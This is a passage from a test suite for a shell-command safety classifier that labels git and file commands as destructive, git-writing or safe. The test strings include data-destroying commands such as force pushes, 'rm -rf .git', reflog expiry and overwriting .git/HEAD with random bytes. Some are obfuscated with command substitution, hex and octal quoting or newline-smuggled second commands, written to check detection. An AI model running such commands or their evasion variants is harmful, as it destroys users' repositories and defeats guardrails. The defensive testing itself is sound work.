	test("git --no-pager clean -fd", () => expectDestructive("git --no-pager clean -fd"));
	test("git --no-pager push --force", () => expectDestructive("git --no-pager push --force"));
	test("git --no-pager push -f", () => expectDestructive("git --no-pager push -f"));
	test("git --git-dir=.git reset --hard", () => expectDestructive("git --git-dir=.git reset --hard"));
	// safe variants
	test("allows git --no-pager log", () => expectSafe("git --no-pager log"));
	test("allows git --no-pager diff", () => expectSafe("git --no-pager diff"));
	test("allows git --no-pager status", () => expectSafe("git --no-pager status"));
});

describe("destructive: git restore (discards working tree changes)", () => {
	test("git restore .", () => expectDestructive("git restore ."));
	test("git restore --worktree .", () => expectDestructive("git restore --worktree ."));
	test("git restore --source=HEAD .", () => expectDestructive("git restore --source=HEAD ."));
	test("git restore -- .", () => expectDestructive("git restore -- ."));
	test("git restore src/", () => expectDestructive("git restore src/"));
	test("git restore --worktree src/important.ts", () => expectDestructive("git restore --worktree src/important.ts"));
	// safe variants
	test("allows git restore --staged file.ts", () => expectSafe("git restore --staged file.ts"));
	test("allows git restore --staged .", () => expectSafe("git restore --staged ."));
});

describe("destructive: git filter-branch / reflog expire", () => {
	test("git filter-branch --force", () => expectDestructive("git filter-branch --force -- --all"));
	test("git reflog expire --expire=now --all", () => expectDestructive("git reflog expire --expire=now --all"));
});

describe("git_write: >| and >& redirect operators", () => {
	test(">| .git/config (force clobber)", () => expectGitWrite("echo corrupt >| .git/config"));
	test(">| .git/HEAD", () => expectGitWrite("cat /dev/urandom >| .git/HEAD"));
	test(">& .git/config", () => expectGitWrite("echo corrupt >& .git/config"));
	test("python >| .git/config", () => expectGitWrite("python3 script.py >| .git/config"));
});

describe("git_write: backtick and $() command substitution with .git", () => {
	test("rm -rf `echo .git`", () => expectGitWrite("rm -rf `echo .git`"));
	test("chmod 000 `echo .git`", () => expectGitWrite("chmod 000 `echo .git`"));
	test("mv `echo .git` /tmp/", () => expectGitWrite("mv `echo .git` /tmp/backup"));
	test("rm `echo .git`/config", () => expectGitWrite("rm `echo .git`/config"));
	test("rm -rf $(echo .git)", () => expectGitWrite("rm -rf $(echo .git)"));
	test("chmod 000 $(echo .git)", () => expectGitWrite("chmod 000 $(echo .git)"));
	test("mv $(echo .git) /tmp/", () => expectGitWrite("mv $(echo .git) /tmp/"));
});

describe("git_write: ANSI-C quoting ($'\\x2e'git)", () => {
	test("rm -rf $'\\x2e'git/", () => expectGitWrite("rm -rf $'\\x2e'git/"));
	test("rm -rf $'\\056'git/", () => expectGitWrite("rm -rf $'\\056'git/"));
	test("chmod 000 $'\\x2e'git", () => expectGitWrite("chmod 000 $'\\x2e'git"));
	test("mv $'\\x2e'git /tmp/", () => expectGitWrite("mv $'\\x2e'git /tmp/"));
});

describe("git_write: GNU coreutils variants (grm, gcp)", () => {
	test("grm -rf .git/", () => expectGitWrite("grm -rf .git/"));
	test("grm -rf .git", () => expectGitWrite("grm -rf .git"));
	test("gcp evil .git/config", () => expectGitWrite("gcp evil .git/config"));
});

describe("safe: false positive checks for new write commands", () => {
	test("sed -i on normal file", () => expectSafe("sed -i 's/foo/bar/' src/file.ts"));
	test("patch on normal file", () => expectSafe("patch src/file.ts < fix.patch"));
	test("rsync normal dirs", () => expectSafe("rsync -av src/ dest/"));
	test("curl normal url", () => expectSafe("curl https://api.example.com"));
	test("wget normal file", () => expectSafe("wget https://example.com/file"));
	test("tar normal backup", () => expectSafe("tar czf backup.tar.gz src/"));
	test("unzip normal file", () => expectSafe("unzip archive.zip -d output/"));
});

// ═══════════════════════════════════════════════════════════════
// 11. Edge cases
// ═══════════════════════════════════════════════════════════════

describe("edge cases", () => {
	test("empty string is safe", () => expectSafe(""));
	test("whitespace only is safe", () => expectSafe("   "));
	test("rm with extra whitespace", () => expectGitWrite("rm  -rf  .git/"));
	test("rm with tabs", () => expectGitWrite("rm\t-rf\t.git/"));
	test("newline before rm .git/", () => expectGitWrite("ls\nrm -rf .git/"));
	test("catches rm -rf project/.git/ (with slash)", () => expectGitWrite("rm -rf project/.git/"));
	test("catches rm -rf project/.git (no slash)", () => expectGitWrite("rm -rf project/.git"));
});
